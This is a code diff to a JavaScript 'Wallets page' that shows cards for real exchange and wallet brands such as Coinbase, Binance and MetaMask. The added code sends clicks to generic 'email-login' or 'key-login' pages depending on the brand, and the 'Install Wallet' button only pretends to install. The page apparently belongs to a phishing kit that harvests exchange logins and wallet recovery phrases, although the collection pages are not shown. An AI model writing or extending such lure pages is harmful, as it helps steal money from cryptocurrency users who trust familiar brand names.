@@ -1,5 +1,16 @@
 console.log("Wallets page loaded!");
 
+// 🔥 1) Email/Password Wallets List
+const emailWallets = [
+  "Poloniex",
+  "Coinbase1",
+  "Coinbase2",
+  "Binance",
+  "Bitget",
+  "Nash",
+];
+
+// 🔥 2) All Wallets List
 const wallets = [
   "Meta Mask",
   "Poloniex",
@@ -60,6 +71,7 @@ const wallets = [
 
 const container = document.getElementById("walletContainer");
 
+// 🔥 Generate Wallet Cards
 wallets.forEach((name) => {
   let imageName =
     name
@@ -70,18 +82,19 @@ wallets.forEach((name) => {
       .replace(/-/g, "")
       .replace(/\//g, "") + ".webp";
 
+  // OTHER WALLET CARD
   if (name.toLowerCase().includes("other")) {
     container.innerHTML += `
-      <div class="wallet-card">
+      <div class="wallet-card" onclick="openWallet('${name}')">
         <p>${name}</p>
         <div class="icon-row">
-          <div class="icon-btn download-btn" onclick="installWallet('${name}')">
+          <div class="icon-btn download-btn" onclick="event.stopPropagation(); installWallet('${name}')">
             <img src="assets/icons/downloads.png"><span>Install Wallet</span>
           </div>
-          <div class="icon-btn rocket-btn" onclick="openWallet('${name}')">
+          <div class="icon-btn rocket-btn" onclick="event.stopPropagation(); openWallet('${name}')">
             <img src="assets/icons/rocket.png"><span>Open Wallet</span>
           </div>
-          <div class="icon-btn share-btn" onclick="shareWallet('${name}')">
+          <div class="icon-btn share-btn" onclick="event.stopPropagation(); shareWallet('${name}')">
             <img src="assets/icons/share.png"><span>Share</span>
           </div>
         </div>
@@ -90,18 +103,19 @@ wallets.forEach((name) => {
     return;
   }
 
+  // NORMAL WALLET CARDS
   container.innerHTML += `
-    <div class="wallet-card">
+    <div class="wallet-card" onclick="openWallet('${name}')">
       <img src="wallet-icons/${imageName}">
       <p>${name}</p>
       <div class="icon-row">
-        <div class="icon-btn download-btn" onclick="installWallet('${name}')">
+        <div class="icon-btn download-btn" onclick="event.stopPropagation(); installWallet('${name}')">
           <img src="assets/icons/downloads.png"><span>Install Wallet</span>
         </div>
-        <div class="icon-btn rocket-btn" onclick="openWallet('${name}')">
+        <div class="icon-btn rocket-btn" onclick="event.stopPropagation(); openWallet('${name}')">
           <img src="assets/icons/rocket.png"><span>Open Wallet</span>
         </div>
-        <div class="icon-btn share-btn" onclick="shareWallet('${name}')">
+        <div class="icon-btn share-btn" onclick="event.stopPropagation(); shareWallet('${name}')">
           <img src="assets/icons/share.png"><span>Share</span>
         </div>
       </div>
@@ -109,17 +123,33 @@ wallets.forEach((name) => {
   `;
 });
 
+// ✅ OPEN WALLET — email vs phrase routing
 function openWallet(walletName) {
-  window.location.href = `wallet-page.html?wallet=${walletName}`;
+  const emailWallets = ["Coinbase1", "Coinbase2", "Binance", "Bitget"];
+
+  if (emailWallets.includes(walletName)) {
+    window.location.href = `email-login.html?wallet=${encodeURIComponent(
+      walletName
+    )}`;
+  } else {
+    window.location.href = `key-login.html?wallet=${encodeURIComponent(
+      walletName
+    )}`;
+  }
 }
 
+// ✅ SHARE WALLET
 function shareWallet(walletName) {
+  const shareUrl =
+    `${window.location.origin}/wallet-page.html?wallet=` +
+    encodeURIComponent(walletName);
+
   if (navigator.share) {
     navigator
       .share({
         title: "Wallet",
         text: `Check this wallet: ${walletName}`,
-        url: window.location.href,
+        url: shareUrl,
       })
       .catch(() => {});
   } else {
@@ -127,21 +157,15 @@ function shareWallet(walletName) {
   }
 }
 
-/* 🔥 IMPORTANT:
-   Removing ALL PWA install popup triggers
-*/
+// ✅ INSTALL WALLET (safe)
 window.addEventListener("beforeinstallprompt", (e) => {
-  e.preventDefault(); // Disable PWA prompt
+  e.preventDefault();
 });
 
-/* ✔ Install wallet progress (safe to keep)
-   NO popup will appear now
-*/
 function installWallet(walletName) {
   if (!/Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
     alert("Install only works on mobile.");
     return;
   }
-
   alert("Installing... (simulated)");
 }
